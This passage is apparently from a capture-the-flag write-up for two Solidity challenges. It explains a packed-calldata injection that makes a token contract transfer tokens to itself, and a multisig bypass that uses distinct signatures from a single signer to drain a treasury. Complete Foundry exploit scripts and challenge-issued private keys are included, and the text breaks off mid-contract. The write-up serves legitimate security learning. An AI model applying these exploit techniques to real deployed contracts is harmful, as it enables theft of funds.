    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
</svg></p>
</blockquote>
<p>The <code>Doju</code> contract implements a token that can be traded with ETH using <code>buyTokens</code> and <code>sellTokens</code>. We have 100 BD and there are around $1.1 \cdot 10^{59}$ BD unminted at the beginning. The goal is to obtain at least $5.7 \cdot 10^{58}$ BD.</p>
<h3 id="solution-1">Solution<a href="#solution-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>The amount of BD we need to gain seemed surreal because the total supply is only 100 BD. Minting is not the way to go because the price is too high (1 ETH per BD).</p>
<p>Fortunately, we are able to trigger calls from <code>Doju::sellTokens</code> to an arbitrary contract (<code>to</code>) with a packed payload, where most of the parameters are supplied by the caller. We should be able to call <code>Doju::transfer</code> if we craft the payload right.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Doju</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl">    <span class="c1">// Sell tokens and receive ETH
</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">sellTokens</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">tokenAmount</span><span class="p">,</span> <span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">minOut</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">ethValue</span> <span class="o">=</span> <span class="n">_tokensToEth</span><span class="p">(</span><span class="n">tokenAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">_transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">tokenAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">totalSupply</span> <span class="o">-=</span> <span class="n">tokenAmount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,)</span> <span class="o">=</span>
</span></span><span class="line"><span class="cl">            <span class="k">payable</span><span class="p">(</span><span class="n">to</span><span class="p">).</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">ethValue</span><span class="p">}(</span><span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span><span class="n">minOut</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">tokenAmount</span><span class="p">,</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">ethValue</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">minOut</span> <span class="o">&gt;</span> <span class="n">ethValue</span><span class="p">,</span> <span class="s">&#34;minOut not met&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">,</span> <span class="s">&#34;Transfer failed&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Burn</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="n">tokenAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">emit</span> <span class="n">Transfer</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="n">tokenAmount</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// ...
</span></span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>The following figure shows the message structure for the <code>payable(to).call</code>. The green values are easier to control, the red values are fixed, and we would need to compute (or brute-force) to better manipulate the yellow values:</p>


<figure>
  <img src="/images/2024-09-28-blazctf/doju-call-structure-given.png" title="Message structure of the call in Doju::sellTokens.">
  
  <figcaption>Message structure of the call in Doju::sellTokens.</figcaption>
  
</figure>

<p>Since we want to call <code>doju.transfer</code>, we would need to make <code>to</code> to be the address of the Doju contract. We would also need to make <code>ethValue</code> zero as <code>Doju::transfer</code> is non-payable.</p>


<figure>
  <img src="/images/2024-09-28-blazctf/doju-call-structure-target.png" title="Message structure that we want.">
  
  <figcaption>Message structure that we want.</figcaption>
  
</figure>

<p>Here <code>0xa9059cbb</code> is the function signature for <code>Doju::transfer</code>, and <code>0xC47f...d6E9</code> is the address for the Doju contract instance.</p>
<p>To align with the provided message structure, we will need the recipient address of the token, <code>to</code>, to end with <code>c47fcc04</code>. I used <a href="https://github.com/1inch/profanity2"
   
   target="_blank" rel="noopener noreferrer" >profanity2</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
</svg> to generate an address (<code>0x17bB9d66B3e48a81a00b9ba75C297fc4c47fCC04</code>) in a minute.</p>
<p>Finally, this is the message call that I used to transfer some tokens to the newly generated account. We will be able to gain sufficient tokens by calling it twice:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="n">doju</span><span class="p">.</span><span class="n">sellTokens</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*tokenAmount=*/</span><span class="mh">0x0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*to=*/</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xC47fcC04762b188c3C5D1D01aBb279e21be4d6E9</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="cm">/*minOut=*/</span><span class="mh">0xa9059cbb00000000000000000000000017bb9d66b3e48a81a00b9ba75c297fc4</span>
</span></span><span class="line"><span class="cl"><span class="p">);</span>
</span></span></code></pre></div><h3 id="solution-script-1">Solution Script<a href="#solution-script-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">13</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span> <span class="n">console</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Challenge</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../src/Challenge.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Doju</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;../src/Doju.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">forge script script/Exploit.s.sol:Exploit1Script --private-key 0x9ab0fe65575aa17213ff8d6ac83462d3932849aeb42ca70b0cb3e85d24feb7d9 -vvvv --rpc-url http://rpc.ctf.so:8545/.../main --broadcast &amp;&amp; 
</span></span></span><span class="line"><span class="cl"><span class="cm">forge script script/Exploit.s.sol:Exploit2Script --private-key 0xb13d58d135dbf6a31afba3bd16530900a13e9b49357e2b67a01f5ec35e65a542 -vvvv --rpc-url http://rpc.ctf.so:8545/.../main --broadcast
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Exploit1Script</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Run with the player&#39;s secret key (provided by the instancer).
</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Challenge</span> <span class="n">challenge</span> <span class="o">=</span> <span class="n">Challenge</span><span class="p">(</span><span class="mh">0x21474f7350Ea47e17229ed1a27B43D17992A8777</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Doju</span> <span class="n">doju</span> <span class="o">=</span> <span class="n">challenge</span><span class="p">.</span><span class="n">doju</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">pk</span> <span class="o">=</span> <span class="mh">0xb13d58d135dbf6a31afba3bd16530900a13e9b49357e2b67a01f5ec35e65a542</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">player</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">player2</span> <span class="o">=</span> <span class="n">vm</span><span class="p">.</span><span class="n">addr</span><span class="p">(</span><span class="n">pk</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">payable</span><span class="p">(</span><span class="n">player2</span><span class="p">).</span><span class="nb">call</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">}(</span><span class="s">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">Exploit2Script</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Run with the secret key 0xb13d58d135dbf6a31afba3bd16530900a13e9b49357e2b67a01f5ec35e65a542,
</span></span></span><span class="line"><span class="cl">    <span class="c1">// where the address ends with 0xc47fcc04.
</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Challenge</span> <span class="n">challenge</span> <span class="o">=</span> <span class="n">Challenge</span><span class="p">(</span><span class="mh">0x21474f7350Ea47e17229ed1a27B43D17992A8777</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">Doju</span> <span class="n">doju</span> <span class="o">=</span> <span class="n">challenge</span><span class="p">.</span><span class="n">doju</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">player</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">player</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span> <span class="o">==</span> <span class="mh">0xc47fcc04</span><span class="p">,</span> <span class="s">&#34;incorrect address (#1)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">minOut</span> <span class="o">=</span> <span class="mh">0xa9059cbb00000000000000000000000000000000000000000000000000000000</span> <span class="o">+</span>
</span></span><span class="line"><span class="cl">            <span class="p">(</span><span class="kt">uint160</span><span class="p">(</span><span class="n">player</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">32</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">to</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">doju</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">tokenAmount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="p">(</span><span class="n">doju</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">doju</span><span class="p">.</span><span class="n">sellTokens</span><span class="p">(</span><span class="n">tokenAmount</span><span class="p">,</span> <span class="n">to</span><span class="p">,</span> <span class="n">minOut</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">doju</span><span class="p">.</span><span class="nb">transfer</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0xc0ffee</span><span class="p">),</span> <span class="n">doju</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="n">player</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">challenge</span><span class="p">.</span><span class="n">isSolved</span><span class="p">(),</span> <span class="s">&#34;not solved&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="cyber-cartel">Cyber Cartel<a href="#cyber-cartel" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<h3 id="challenge-summary-2">Challenge Summary<a href="#challenge-summary-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<blockquote>
<p>Malone, Wiz and Box recently robbed a billionaire and deposited their proceeds into a multisig treasury. And who is Box? The genius hacker behind everything. He's gonna rob his friends...</p>
<p><a href="https://storage.googleapis.com/blazctf24/cyber-cartel.zip"
   
   target="_blank" rel="noopener noreferrer" >Handouts</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
</svg></p>
</blockquote>
<p>We have two contracts in this challenge. <code>BodyGuard</code> is a contract that would call functions from the treasury if we have three signatures from the guardians (two unknown and one being the player). <code>CartelTreasury</code> is a contract that has some functions that are only callable from the <code>bodyGuard</code>. The goal is to drain the ethers from <code>CartelTreasury</code>.</p>
<h3 id="solution-2">Solution<a href="#solution-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<h4 id="part-i-getting-multiple-distinct-signatures-with-a-single-signer">Part I: Getting multiple distinct signatures with a single signer<a href="#part-i-getting-multiple-distinct-signatures-with-a-single-signer" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>The guardian contract will execute an arbitrary call when it is &quot;properly signed&quot;. There are some functions on the cartel contract that can be called only by the guardian contract.</p>
<p>There are some conditions for a message considered to be multi-signed:</p>
<ul>
<li>there are three signatures collected,</li>
<li>the signer for each signature must be one of the three approved guardians, and we are one of them, and</li>
<li>the Keccak256 digests of the signatures must be strictly increasing.</li>
</ul>
<p>In short, we need to collect three distinct signatures from any of the signers. It works even if a single signer is able to provide three distinct signatures.</p>
<p>Modern Ethereum packages use <a href="https://datatracker.ietf.org/doc/html/rfc6979"
   
   target="_blank" rel="noopener noreferrer" >RFC6979</a><svg t="1713426496023" style="margin: 0 0 0 5px;" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="8864" width="10" height="10">
    <path d="M1001.627381 394.106435a44.521739 44.521739 0 1 1-88.598261 0V208.228174l-398.914783 398.914783a54.049391 54.049391 0 1 1-76.577391-76.310261l397.579131-397.490087h-182.984348a44.78887 44.78887 0 1 1 0-89.043479h298.740869c1.335652 0 2.226087 0.534261 3.561739 0.623305s1.78087-0.623304 2.671305-0.623305a40.069565 40.069565 0 0 1 27.158261 11.620174c1.157565 0.667826 2.226087 1.513739 3.116521 2.448696 0.890435 0.979478 1.78087 2.092522 2.671305 3.161043a41.360696 41.360696 0 0 1 11.575652 27.158261c0 0.979478-0.445217 1.825391-0.445218 2.80487s0.445217 2.359652 0.445218 3.650783v298.963478zM111.192598 934.956522h712.347826v-400.695652h89.043479v400.695652a89.043478 89.043478 0 0 1-89.043479 89.043478H111.192598a89.043478 89.043478 0 0 1-89.043478-89.043478V222.608696a89.043478 89.043478 0 0 1 89.043478-89.043479h400.695652v89.043479H111.192598v712.347826z" fill="#666666" p-id="8865"></path>
</svg> to sign a message with a deterministic nonce, for instance, <code>vm.sign</code> in Foundry would always return the same signature. However, signatures created by any nonce is considered valid. This is simply because we are unable to determine, as a verifier, a nonce is <em>the</em> nonce derived with RFC6979. Thus it is possible for a signer to generate distinct signatures for a given message.</p>
<p>One little question remain... What to sign?</p>
<h4 id="part-ii-draining-the-treasury">Part II: Draining the treasury<a href="#part-ii-draining-the-treasury" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h4>
<p>I immediately tried to call <code>treasury.doom</code> using the guardian contract. However, it would not work because the <code>BodyGuard</code> contract has no payable functions.</p>
<p>Instead, we need to fire the body guard (i.e., setting <code>bodyGuard = address(0x0)</code>) with <code>treasury.dismiss</code>. We then can call <code>treasury.initialize</code> with a malicious body guard and call <code>treasury.doom</code> to transfer all the ethers afterwards.</p>
<h3 id="solution-script-2">Solution Script<a href="#solution-script-2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">26</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Script</span><span class="p">,</span> <span class="n">console</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Script.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../src/Challenge.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;../src/CyberCartel.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ExploitScript</span> <span class="k">is</span> <span class="n">Script</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">run</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Challenge</span> <span class="n">challenge</span> <span class="o">=</span> <span class="n">Challenge</span><span class="p">(</span><span class="mh">0x2429A189dd3323AaD7Fc9c1E658Dd80c0ab12Fd5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">CartelTreasury</span> <span class="n">treasury</span> <span class="o">=</span> <span class="n">CartelTreasury</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="n">challenge</span><span class="p">.</span><span class="n">TREASURY</span><span class="p">()));</span>
</span></span><span class="line"><span class="cl">        <span class="n">BodyGuard</span> <span class="n">bodyGuard</span> <span class="o">=</span> <span class="n">BodyGuard</span><span class="p">(</span><span class="n">treasury</span><span class="p">.</span><span class="n">bodyGuard</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">startBroadcast</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">bodyGuard</span><span class="p">.</span><span class="n">guardians</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">),</span> <span class="s">&#34;you are not a guardian&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">BodyGuard</span><span class="p">.</span><span class="n">Proposal</span> <span class="k">memory</span> <span class="n">proposal</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">signatures</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">bytes</span><span class="p">[](</span><span class="mi">3</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">proposal</span><span class="p">.</span><span class="n">expiredAt</span> <span class="o">=</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint32</span><span class="p">).</span><span class="nb">max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">proposal</span><span class="p">.</span><span class="nb">gas</span> <span class="o">=</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint24</span><span class="p">).</span><span class="nb">max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">proposal</span><span class="p">.</span><span class="n">nonce</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">proposal</span><span class="p">.</span><span class="nb">data</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodeWithSelector</span><span class="p">(</span><span class="n">treasury</span><span class="p">.</span><span class="n">gistCartelDismiss</span><span class="p">.</span><span class="nb">selector</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">signatures</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span><span class="p">(</span><span class="mi">70859077052232689629756310103205080667258477748980774236893770954867402388350</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span><span class="p">(</span><span class="mi">14096269543505290919012195916898044762171069125550658007327168284379109563191</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint8</span><span class="p">(</span><span class="mi">28</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">signatures</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span><span class="p">(</span><span class="mi">10372245554972896093582123004174987431211603282413396983811888247534900329891</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span><span class="p">(</span><span class="mi">55103822151495814764573943500738618633285412537396818523717665920905458870443</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint8</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">signatures</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nb">abi</span><span class="p">.</span><span class="nb">encodePacked</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span><span class="p">(</span><span class="mi">70054947218465115124070121157516745380413483924040567416787163687531118442332</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span><span class="p">(</span><span class="mi">22402771072968988044451507239837167350477193281342038924959667106645423636427</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">            <span class="kt">uint8</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">bodyGuard</span><span class="p">.</span><span class="n">propose</span><span class="p">(</span><span class="n">proposal</span><span class="p">,</span> <span class="n">signatures</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ExploitContract</span> <span class="n">exploit</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ExploitContract</span><span class="p">(</span><span class="n">treasury</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">treasury</span><span class="p">.</span><span class="n">initialize</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">exploit</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">        <span class="n">exploit</span><span class="p">.</span><span class="n">run</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">challenge</span><span class="p">.</span><span class="n">isSolved</span><span class="p">(),</span> <span class="s">&#34;not solved&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">ExploitContract</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">CartelTreasury</span> <span class="k">public</span> <span class="k">immutable</span> <span class="n">treasury</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kd">constructor</span> <span class="p">(</span><span class="n">CartelTreasury</span> <span class="n">_treasury</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">treasury</span> <span class="o">=</span> <span class="n">_treasury</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
